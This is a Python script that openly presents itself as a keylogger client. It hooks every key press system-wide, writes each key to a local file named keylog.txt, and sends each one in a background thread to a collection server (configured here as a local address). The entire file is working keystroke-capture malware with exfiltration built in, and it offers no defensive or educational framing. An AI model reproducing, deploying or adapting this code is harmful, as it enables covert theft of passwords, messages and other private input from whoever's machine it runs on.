import keyboard
import requests
import threading

SERVER_URL = 'http://127.0.0.1:5000/log'

def send_keystroke(keystroke):
    """Sends a keystroke to the server."""
    data = {'keystroke': keystroke}
    try:
        response = requests.post(SERVER_URL, json=data)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Error sending keystroke: {e}")

def log_keystroke(event):
    """Logs keystrokes locally"""
    keystroke = event.name
    with open("keylog.txt", "a") as f:
        f.write(keystroke + "\n")

def on_key_press(event):
    """Callback function when a key is pressed."""
    threading.Thread(target=send_keystroke, args=(event.name,)).start()
    log_keystroke(event)  #Log keystroke locally


def main():
    """Starts the keylogger client."""
    print("[+] Starting Keylogger Client... Press Ctrl+C to stop.")
    print(f"[+] Sending keystrokes to {SERVER_URL}\n")
    
    # Start keyboard listener
    keyboard.on_press(on_key_press)
    
    try:
        keyboard.wait()  # Wait for events indefinitely
    except KeyboardInterrupt:
        pass
    finally:
        keyboard.unhook_all()  # Unhook all events on exit
        print("\n[-] Keylogger Client Stopped.")

if __name__ == "__main__":
    main()
